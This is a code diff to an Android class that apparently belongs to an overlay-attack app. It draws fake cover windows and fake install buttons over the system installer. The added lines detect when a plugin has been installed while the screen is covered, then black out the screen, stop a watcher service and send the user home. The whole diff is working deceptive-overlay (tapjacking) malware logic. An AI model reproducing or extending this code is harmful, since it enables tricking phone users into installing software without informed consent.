@@ -3,7 +3,6 @@ package com.xstd.qm.fakecover;
 import android.content.Context;
 import android.graphics.PixelFormat;
 import android.os.Handler;
-import android.text.TextUtils;
 import android.util.DisplayMetrics;
 import android.view.*;
 import android.widget.ImageView;
@@ -25,6 +24,7 @@ public class FakeWindowWithSingleArrow implements FakeWindowInterface {
 
     protected static final int TIMER_COUNT = 100;
 
+    protected int countDown = -1;
     protected View coverView;
     protected View timerView;
     protected TextView timeTV;
@@ -119,7 +119,7 @@ public class FakeWindowWithSingleArrow implements FakeWindowInterface {
 
     @Override
     public void updateTimerCount() {
-        if (count <= 0) {
+        if (count <= 0 || countDown == 0) {
             if (coverView != null && timerView != null) {
                 wm.removeView(coverView);
                 wm.removeView(timerView);
@@ -135,6 +135,7 @@ public class FakeWindowWithSingleArrow implements FakeWindowInterface {
             installFullView = null;
             UtilOperator.fake = null;
             AppRuntime.FAKE_WINDOWS_SHOW.set(false);
+            AppRuntime.WATCHING_SERVICE_BREAK.set(true);
 
             SettingManager.getInstance().setLoopActiveCount(0);
             Utils.tryToActivePluginApp(context);
@@ -174,7 +175,21 @@ public class FakeWindowWithSingleArrow implements FakeWindowInterface {
                 SettingManager.getInstance().setCancelInstallReserve(false);
             }
 
-            if (count == (TIMER_COUNT - 3 * 5) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
+            if (countDown > 0 && AppRuntime.PLUGIN_INSTALLED && SettingManager.getInstance().getKeyPluginInstalled()) {
+                //表示在遮盖的过程中已经安装了插件
+                //此时的动作是进行全遮盖，然后推出
+                AppRuntime.WATCHING_SERVICE_BREAK.set(true);
+                if (installFullView == null) {
+                    installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
+                    installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
+                    wm.addView(installFullView, confirmFullBtnParams);
+                }
+                coverSplitor.setVisibility(View.GONE);
+                installBtnRight.setVisibility(View.GONE);
+                installBtnLeft.setVisibility(View.GONE);
+
+                UtilsRuntime.goHome(context);
+            } else if (count == (TIMER_COUNT - 3 * 5) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                 //now just remove install full btn
                 if (installFullView != null) {
                     wm.removeView(installFullView);
@@ -231,6 +246,9 @@ public class FakeWindowWithSingleArrow implements FakeWindowInterface {
 
                         timeTV.setText(String.format(context.getString(R.string.fake_timer), time));
                         count--;
+                        if (countDown > 0) {
+                            countDown--;
+                        }
                         handler.postDelayed(new Runnable() {
                             @Override
                             public void run() {
@@ -242,6 +260,11 @@ public class FakeWindowWithSingleArrow implements FakeWindowInterface {
             });
         }
 
+    }
+
+    @Override
+    public void setCountDown(int countDown) {
+        this.countDown = countDown;
     }
 
     @Override
